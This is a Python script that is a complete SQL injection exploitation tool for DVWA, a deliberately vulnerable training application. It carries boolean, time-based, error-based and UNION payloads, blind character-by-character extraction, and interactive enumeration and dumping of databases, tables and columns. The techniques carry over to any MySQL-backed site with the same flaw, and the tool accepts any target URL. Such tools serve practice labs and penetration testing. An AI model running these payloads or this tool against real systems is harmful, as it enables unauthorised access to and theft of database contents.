#!/usr/bin/env python3
"""
DVWA SQL Injection Exploiter - Full Version
Supports: Low, Medium, High security levels
Author: Security Researcher
Version: 2.0
"""

import requests
import time
import sys
import concurrent.futures
import argparse
import re
from threading import Lock
from urllib.parse import urljoin
from bs4 import BeautifulSoup

class DVWASQLiExploiter:
    def __init__(self, base_url, cookies, security_level='low', threads=10):
        """
        Initialize the SQLi exploiter for DVWA
        
        Args:
            base_url (str): Base URL of DVWA
            cookies (dict): Session cookies
            security_level (str): 'low', 'medium', or 'high'
            threads (int): Number of concurrent threads
        """
        self.base_url = base_url.rstrip('/')
        self.cookies = cookies
        self.security_level = security_level.lower()
        self.threads = threads
        self.lock = Lock()
        self.session = requests.Session()
        self.csrf_token = None
        self.user_token = None
        
        # Configure based on security level
        if self.security_level == 'low':
            self.target_url = f"{self.base_url}/vulnerabilities/sqli/"
            self.blind_url = f"{self.base_url}/vulnerabilities/sqli_blind/"
            self.method = "GET"
            self.param_type = "query"
        elif self.security_level == 'medium':
            self.target_url = f"{self.base_url}/vulnerabilities/sqli/"
            self.blind_url = f"{self.base_url}/vulnerabilities/sqli_blind/"
            self.method = "POST"
            self.param_type = "form"
        elif self.security_level == 'high':
            self.target_url = f"{self.base_url}/vulnerabilities/sqli/"
            self.blind_url = f"{self.base_url}/vulnerabilities/sqli_blind/"
            self.method = "GET"
            self.param_type = "session"
        else:
            raise ValueError("Security level must be 'low', 'medium', or 'high'")
        
        # Configure session
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
        })
        
        # Update cookies
        self.session.cookies.update(cookies)
        
        print(f"[*] Initialized for DVWA {self.security_level.upper()} security level")
        print(f"[*] Target URL: {self.target_url}")
        print(f"[*] Method: {self.method}")
    
    def fetch_csrf_token(self, url=None):
        """Extract CSRF token from DVWA page"""
        if url is None:
            url = self.target_url
        
        try:
            response = self.session.get(url, timeout=10)
            response.raise_for_status()
            
            # Look for CSRF token in various forms
            soup = BeautifulSoup(response.text, 'html.parser')
            
            # Check for user_token input (common in DVWA)
            user_token_input = soup.find('input', {'name': 'user_token'})
            if user_token_input and user_token_input.get('value'):
                self.user_token = user_token_input.get('value')
                print(f"[+] Found user_token: {self.user_token}")
            
            # Check for CSRF token in meta tags or inputs
            meta_csrf = soup.find('meta', {'name': 'csrf-token'})
            if meta_csrf and meta_csrf.get('content'):
                self.csrf_token = meta_csrf.get('content')
            
            # Also check for hidden inputs with token in name
            for input_tag in soup.find_all('input', type='hidden'):
                if 'token' in input_tag.get('name', '').lower():
                    self.csrf_token = input_tag.get('value')
                    print(f"[+] Found CSRF token: {self.csrf_token}")
                    break
            
            return response.text
            
        except Exception as e:
            print(f"[!] Error fetching CSRF token: {e}")
            return None
    
    def send_payload(self, payload, blind=False):
        """
        Send SQL injection payload based on security level
        
        Args:
            payload (str): SQL injection payload
            blind (bool): Whether to use blind SQLi page
        
        Returns:
            tuple: (response_text, response_time)
        """
        target_url = self.blind_url if blind else self.target_url
        response_time = 0
        
        try:
            start_time = time.time()
            
            if self.security_level == 'low':
                if self.method == "GET":
                    params = {"id": payload, "Submit": "Submit"}
                    if blind:
                        params = {"id": payload, "Submit": "Submit"}
                    response = self.session.get(
                        target_url,
                        params=params,
                        timeout=10
                    )
                else:
                    data = {"id": payload, "Submit": "Submit"}
                    response = self.session.post(
                        target_url,
                        data=data,
                        timeout=10
                    )
            
            elif self.security_level == 'medium':
                # Medium uses POST with dropdown/select
                data = {"id": payload, "Submit": "Submit"}
                
                # Add CSRF token if available
                if self.csrf_token:
                    data['token'] = self.csrf_token
                if self.user_token:
                    data['user_token'] = self.user_token
                
                response = self.session.post(
                    target_url,
                    data=data,
                    timeout=10
                )
            
            elif self.security_level == 'high':
                # High uses session-based ID, need to set it first
                # First visit the page to get session setup
                if not self.csrf_token:
                    self.fetch_csrf_token(target_url)
                
                # High level often requires setting session via one page
                # then querying via another
                if blind:
                    # For blind SQLi high, we need to use the separate page
                    setup_url = f"{self.base_url}/vulnerabilities/sqli_blind/"
                    setup_data = {"id": payload, "Submit": "Submit"}
                    
                    if self.user_token:
                        setup_data['user_token'] = self.user_token
                    
                    # First set the ID in session
                    self.session.post(setup_url, data=setup_data, timeout=10)
                    
                    # Then check the result
                    check_url = f"{self.base_url}/vulnerabilities/sqli_blind/"
                    response = self.session.get(check_url, timeout=10)
                else:
                    # For regular SQLi high
                    data = {"id": payload, "Submit": "Submit"}
                    
                    if self.user_token:
                        data['user_token'] = self.user_token
                    
                    response = self.session.post(
                        f"{self.base_url}/vulnerabilities/sqli/",
                        data=data,
                        timeout=10
                    )
            
            response_time = time.time() - start_time
            return response.text, response_time
            
        except Exception as e:
            print(f"[!] Error sending payload: {e}")
            return None, 0
    
    def test_boolean_based(self, payload_true, payload_false):
        """Test for boolean-based SQL injection"""
        print("[*] Testing boolean-based injection...")
        
        response_true, _ = self.send_payload(payload_true)
        response_false, _ = self.send_payload(payload_false)
        
        if response_true and response_false:
            # Check for differences in responses
            diff_count = self.compare_responses(response_true, response_false)
            if diff_count > 0:
                print(f"[+] Boolean-based possible (differences: {diff_count})")
                return True
        
        return False
    
    def test_time_based(self, payload_sleep, payload_no_sleep, threshold=1):
        """Test for time-based SQL injection"""
        print("[*] Testing time-based injection...")
        
        _, time_sleep = self.send_payload(payload_sleep)
        _, time_no_sleep = self.send_payload(payload_no_sleep)
        
        if time_sleep >= threshold and time_no_sleep < threshold:
            print(f"[+] Time-based possible (sleep: {time_sleep:.2f}s, normal: {time_no_sleep:.2f}s)")
            return True
        
        return False
    
    def test_error_based(self, payload_error):
        """Test for error-based SQL injection"""
        print("[*] Testing error-based injection...")
        
        response, _ = self.send_payload(payload_error)
        
        if response:
            error_patterns = [
                r"SQL syntax.*MySQL",
                r"Warning.*mysql",
                r"MySQL.*error",
                r"SQLSTATE",
                r"syntax error",
                r"unexpected token",
                r"You have an error in your SQL syntax"
            ]
            
            for pattern in error_patterns:
                if re.search(pattern, response, re.IGNORECASE):
                    print("[+] Error-based possible")
                    return True
        
        return False
    
    def test_union_based(self):
        """Test for union-based SQL injection"""
        print("[*] Testing union-based injection...")
        
        # Test for number of columns using ORDER BY
        for i in range(1, 15):
            payload = f"1' ORDER BY {i}-- -"
            response, _ = self.send_payload(payload)
            
            if response and "Unknown column" in response:
                num_columns = i - 1
                print(f"[+] Union-based possible with {num_columns} columns")
                
                # Try to find string columns
                for col in range(1, num_columns + 1):
                    nulls = ["NULL"] * num_columns
                    nulls[col-1] = "'test'"
                    payload = f"1' UNION SELECT {','.join(nulls)}-- -"
                    response, _ = self.send_payload(payload)
                    
                    if response and "test" in response:
                        print(f"[+] String column at position {col}")
                        return True, num_columns, col
        
        return False, 0, 0
    
    def compare_responses(self, resp1, resp2):
        """Compare two HTML responses for differences"""
        # Extract visible text for comparison
        def extract_text(html):
            soup = BeautifulSoup(html, 'html.parser')
            # Remove scripts and styles
            for script in soup(["script", "style"]):
                script.decompose()
            return soup.get_text().strip()
        
        text1 = extract_text(resp1)
        text2 = extract_text(resp2)
        
        # Simple difference count
        diff_count = sum(1 for a, b in zip(text1[:500], text2[:500]) if a != b)
        return diff_count
    
    def detect_injection_type(self):
        """Detect what types of SQL injection are possible"""
        print("\n" + "="*60)
        print("[*] DETECTING SQL INJECTION VULNERABILITIES")
        print("="*60)
        
        injection_types = []
        
        # Test different payloads based on security level
        if self.security_level == 'low':
            # Test boolean-based
            if self.test_boolean_based("1' AND '1'='1", "1' AND '1'='2"):
                injection_types.append("boolean")
            
            # Test time-based
            if self.test_time_based("1' AND SLEEP(2)-- -", "1' AND SLEEP(0)-- -", 1.5):
                injection_types.append("time")
            
            # Test error-based
            if self.test_error_based("1' AND EXTRACTVALUE(0,CONCAT(0x7e,VERSION()))-- -"):
                injection_types.append("error")
            
            # Test union-based
            union_possible, num_cols, str_col = self.test_union_based()
            if union_possible:
                injection_types.append("union")
                self.num_columns = num_cols
                self.string_column = str_col
        
        elif self.security_level == 'medium':
            # Medium often uses numeric IDs, adjust payloads
            if self.test_boolean_based("1 AND 1=1", "1 AND 1=2"):
                injection_types.append("boolean")
            
            if self.test_time_based("1 AND SLEEP(2)-- ", "1 AND SLEEP(0)-- ", 1.5):
                injection_types.append("time")
        
        elif self.security_level == 'high':
            # High level requires different approach
            print("[*] High security level - using specialized tests")
            
            # Try session-based injection
            if self.test_time_based("1' AND SLEEP(2)#", "1' AND SLEEP(0)#", 1.5):
                injection_types.append("time")
            
            # Try with different comment syntax
            if self.test_boolean_based("1' AND '1'='1'#", "1' AND '1'='2'#"):
                injection_types.append("boolean")
        
        if injection_types:
            print(f"\n[+] Detected injection types: {', '.join(injection_types)}")
            return injection_types
        else:
            print("\n[-] No SQL injection vulnerabilities detected")
            return []
    
    def extract_data_union(self, query, limit=10):
        """Extract data using UNION technique"""
        print(f"[*] Extracting data with UNION: {query[:50]}...")
        
        nulls = ["NULL"] * self.num_columns
        nulls[self.string_column - 1] = f"({query})"
        
        payload = f"1' UNION SELECT {','.join(nulls)} LIMIT {limit}-- -"
        response, _ = self.send_payload(payload)
        
        if response:
            # Parse response to extract data
            soup = BeautifulSoup(response, 'html.parser')
            
            # Look for data in pre tags (common in DVWA)
            pre_tags = soup.find_all('pre')
            for pre in pre_tags:
                text = pre.get_text().strip()
                if text and len(text) > 1 and text != "User ID:":
                    return text
            
            # Look for data in tables
            tables = soup.find_all('table')
            for table in tables:
                rows = table.find_all('tr')
                for row in rows[1:]:  # Skip header
                    cols = row.find_all('td')
                    if len(cols) >= 2:
                        return cols[1].get_text().strip()
        
        return None
    
    def blind_extract_char(self, query, position, method="binary"):
        """Extract single character using blind technique"""
        if method == "binary":
            # Binary search (fast)
            low, high = 32, 126
            
            while low <= high:
                mid = (low + high) // 2
                
                # Test if char >= mid
                payload = f"1' AND ASCII(SUBSTRING(({query}),{position},1))>={mid}-- -"
                response_true, _ = self.send_payload(payload, blind=True)
                
                if response_true and "exists" in response_true.lower():
                    # Char >= mid, test if char == mid
                    payload = f"1' AND ASCII(SUBSTRING(({query}),{position},1))={mid}-- -"
                    response_eq, _ = self.send_payload(payload, blind=True)
                    
                    if response_eq and "exists" in response_eq.lower():
                        return chr(mid)
                    else:
                        low = mid + 1
                else:
                    high = mid - 1
        
        elif method == "linear":
            # Linear search (slow but reliable)
            for ascii_val in range(32, 127):
                payload = f"1' AND ASCII(SUBSTRING(({query}),{position},1))={ascii_val}-- -"
                response, _ = self.send_payload(payload, blind=True)
                
                if response and "exists" in response.lower():
                    return chr(ascii_val)
        
        return None
    
    def blind_extract_data(self, query, max_length=100):
        """Extract data using blind SQL injection"""
        print(f"[*] Blind extracting: {query[:50]}...")
        
        result = ""
        position = 1
        
        # First, get length if needed
        length_payload = f"1' AND LENGTH(({query}))>0-- -"
        response, _ = self.send_payload(length_payload, blind=True)
        
        while True:
            char = self.blind_extract_char(query, position, method="binary")
            if not char:
                break
            
            result += char
            sys.stdout.write(f"\r[+] Progress: {position} chars -> '{result}'")
            sys.stdout.flush()
            
            if len(result) >= max_length:
                break
            
            position += 1
        
        print()
        return result
    
    def get_database_info(self):
        """Extract database information"""
        print("\n" + "="*60)
        print("[*] EXTRACTING DATABASE INFORMATION")
        print("="*60)
        
        info = {}
        
        # Test if UNION is available
        injection_types = self.detect_injection_type()
        
        if "union" in injection_types:
            print("[*] Using UNION-based extraction")
            
            queries = {
                "version": "@@version",
                "database": "database()",
                "user": "user()",
                "hostname": "@@hostname"
            }
            
            for key, query in queries.items():
                result = self.extract_data_union(query)
                if result:
                    info[key] = result
                    print(f"[+] {key}: {result}")
        
        else:
            print("[*] Using blind extraction")
            
            # Use blind SQLi
            queries = [
                ("version", "@@version"),
                ("database", "database()"),
                ("user", "user()")
            ]
            
            for key, query in queries:
                result = self.blind_extract_data(query)
                if result:
                    info[key] = result
                    print(f"[+] {key}: {result}")
        
        return info
    
    def get_databases(self):
        """Get list of databases"""
        print("\n[*] Extracting database list...")
        
        query = "SELECT GROUP_CONCAT(schema_name) FROM information_schema.schemata"
        result = self.blind_extract_data(query)
        
        if result:
            databases = [db.strip() for db in result.split(',') if db.strip()]
            print(f"[+] Found {len(databases)} databases")
            for i, db in enumerate(databases, 1):
                print(f"  {i}. {db}")
            return databases
        
        return []
    
    def get_tables(self, database):
        """Get tables from a database"""
        print(f"\n[*] Extracting tables from '{database}'...")
        
        query = f"SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema='{database}'"
        result = self.blind_extract_data(query)
        
        if result:
            tables = [tbl.strip() for tbl in result.split(',') if tbl.strip()]
            print(f"[+] Found {len(tables)} tables in '{database}'")
            for i, tbl in enumerate(tables, 1):
                print(f"  {i}. {tbl}")
            return tables
        
        return []
    
    def get_columns(self, database, table):
        """Get columns from a table"""
        print(f"\n[*] Extracting columns from '{database}.{table}'...")
        
        query = f"SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_schema='{database}' AND table_name='{table}'"
        result = self.blind_extract_data(query)
        
        if result:
            columns = [col.strip() for col in result.split(',') if col.strip()]
            print(f"[+] Found {len(columns)} columns in '{table}'")
            for i, col in enumerate(columns, 1):
                print(f"  {i}. {col}")
            return columns
        
        return []
    
    def dump_table(self, database, table, columns, limit=5):
        """Dump data from a table"""
        print(f"\n[*] Dumping data from '{database}.{table}'...")
        
        # Build query with specified columns
        cols_str = ", ".join(columns)
        query = f"SELECT CONCAT_WS('|', {cols_str}) FROM {database}.{table} LIMIT {limit}"
        
        result = self.blind_extract_data(query, max_length=500)
        
        if result:
            rows = [row.strip() for row in result.split(',') if row.strip()]
            print(f"\n[+] Dumped {len(rows)} rows:")
            
            for i, row in enumerate(rows, 1):
                values = row.split('|')
                print(f"\nRow {i}:")
                for col, val in zip(columns, values):
                    print(f"  {col}: {val[:50]}{'...' if len(val) > 50 else ''}")
        
        return result
    
    def interactive_mode(self):
        """Interactive exploitation mode"""
        print("\n" + "="*60)
        print("DVWA SQL INJECTION EXPLOITER - INTERACTIVE MODE")
        print("="*60)
        
        # First, fetch CSRF token if needed
        if self.security_level in ['medium', 'high']:
            print("[*] Fetching CSRF tokens...")
            self.fetch_csrf_token()
        
        # Detect injection types
        injection_types = self.detect_injection_type()
        if not injection_types:
            print("\n[!] No SQL injection vulnerabilities found!")
            return
        
        # Get database info
        print("\n[1/7] Getting database information...")
        db_info = self.get_database_info()
        
        if not db_info:
            print("[!] Failed to get database information")
            # Try blind extraction as fallback
            print("[*] Trying blind extraction fallback...")
        
        # Get databases
        print("\n[2/7] Enumerating databases...")
        databases = self.get_databases()
        
        if not databases:
            print("[!] No databases found")
            return
        
        # Select database
        print("\n[3/7] Select database:")
        for i, db in enumerate(databases, 1):
            print(f"  {i}. {db}")
        
        try:
            db_choice = input("\n[?] Select database number (or 'all'): ").strip()
            
            if db_choice.lower() == 'all':
                selected_dbs = databases
            elif db_choice.isdigit() and 1 <= int(db_choice) <= len(databases):
                selected_dbs = [databases[int(db_choice) - 1]]
            else:
                print("[!] Invalid selection")
                return
            
            # Get tables for selected databases
            print("\n[4/7] Enumerating tables...")
            all_tables = []
            
            for db in selected_dbs:
                tables = self.get_tables(db)
                if tables:
                    for tbl in tables:
                        all_tables.append((db, tbl))
            
            if not all_tables:
                print("[!] No tables found")
                return
            
            # Select table
            print("\n[5/7] Select table:")
            for i, (db, tbl) in enumerate(all_tables, 1):
                print(f"  {i}. {db}.{tbl}")
            
            table_choice = input("\n[?] Select table number: ").strip()
            
            if table_choice.isdigit() and 1 <= int(table_choice) <= len(all_tables):
                selected_db, selected_table = all_tables[int(table_choice) - 1]
                
                # Get columns
                print(f"\n[6/7] Getting columns from '{selected_db}.{selected_table}'...")
                columns = self.get_columns(selected_db, selected_table)
                
                if columns:
                    # Dump data
                    print(f"\n[7/7] Dumping data from '{selected_db}.{selected_table}'...")
                    
                    limit = input("[?] Number of rows to dump (default: 5): ").strip()
                    limit = int(limit) if limit.isdigit() else 5
                    
                    self.dump_table(selected_db, selected_table, columns, limit)
                else:
                    print("[!] No columns found")
            else:
                print("[!] Invalid selection")
        
        except KeyboardInterrupt:
            print("\n\n[!] Interrupted by user")
        except Exception as e:
            print(f"\n[!] Error: {e}")
        
        print("\n" + "="*60)
        print("[+] EXPLOITATION COMPLETED")
        print("="*60)
    
    def test_all_levels(self):
        """Test all security levels automatically"""
        print("\n" + "="*60)
        print("[*] TESTING ALL SECURITY LEVELS")
        print("="*60)
        
        original_level = self.security_level
        
        for level in ['low', 'medium', 'high']:
            print(f"\n\n{'='*40}")
            print(f"[*] TESTING {level.upper()} SECURITY LEVEL")
            print(f"{'='*40}")
            
            self.security_level = level
            
            # Update URLs based on level
            if level == 'low':
                self.method = "GET"
                self.param_type = "query"
            elif level == 'medium':
                self.method = "POST"
                self.param_type = "form"
            elif level == 'high':
                self.method = "GET"
                self.param_type = "session"
            
            # Clear tokens
            self.csrf_token = None
            self.user_token = None
            
            try:
                # Test vulnerability
                injection_types = self.detect_injection_type()
                if injection_types:
                    print(f"[+] {level.upper()} level is VULNERABLE")
                    print(f"    Injection types: {', '.join(injection_types)}")
                else:
                    print(f"[-] {level.upper()} level is NOT VULNERABLE")
            
            except Exception as e:
                print(f"[!] Error testing {level} level: {e}")
        
        # Restore original level
        self.security_level = original_level

def main():
    parser = argparse.ArgumentParser(
        description='DVWA SQL Injection Exploiter - Full Version (All Security Levels)',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  %(prog)s -u http://localhost/dvwa -s abc123 -l low
  %(prog)s -u http://192.168.1.100/dvwa -s xyz789 -l medium -t 20
  %(prog)s -u http://dvwa.test -s sessionid --test-all
  %(prog)s -u http://localhost:8080/dvwa -s phpsessid -l high --auto
        
Note: You need to set DVWA security level manually in the web interface.
        """
    )
    
    parser.add_argument('-u', '--url', required=True,
                       help='DVWA base URL (e.g., http://localhost/dvwa)')
    parser.add_argument('-s', '--session', required=True,
                       help='PHPSESSID cookie value')
    parser.add_argument('-l', '--level', default='low',
                       choices=['low', 'medium', 'high'],
                       help='DVWA security level (default: low)')
    parser.add_argument('-t', '--threads', type=int, default=10,
                       help='Number of threads (default: 10)')
    parser.add_argument('--test-all', action='store_true',
                       help='Test all security levels')
    parser.add_argument('--auto', action='store_true',
                       help='Auto-detect and exploit without interactive mode')
    
    args = parser.parse_args()
    
    # Configure cookies
    cookies = {
        'PHPSESSID': args.session,
        'security': args.level
    }
    
    print("""
╔══════════════════════════════════════════════════════════╗
║      DVWA SQL INJECTION EXPLOITER - FULL VERSION        ║
║               Supports: Low, Medium, High               ║
╚══════════════════════════════════════════════════════════╝
    """)
    
    print(f"[*] Target: {args.url}")
    print(f"[*] Session: {args.session}")
    print(f"[*] Security Level: {args.level.upper()}")
    print(f"[*] Threads: {args.threads}")
    
    try:
        # Create exploiter instance
        exploiter = DVWASQLiExploiter(
            base_url=args.url,
            cookies=cookies,
            security_level=args.level,
            threads=args.threads
        )
        
        if args.test_all:
            # Test all security levels
            exploiter.test_all_levels()
        elif args.auto:
            # Auto-exploit mode
            print("\n[*] Starting auto-exploitation...")
            exploiter.detect_injection_type()
            exploiter.get_database_info()
        else:
            # Interactive mode
            exploiter.interactive_mode()
    
    except KeyboardInterrupt:
        print("\n\n[!] Exploitation interrupted by user")
        sys.exit(0)
    except Exception as e:
        print(f"\n[!] Critical error: {e}")
        import traceback
        traceback.print_exc()
        sys.exit(1)

if __name__ == "__main__":
    main()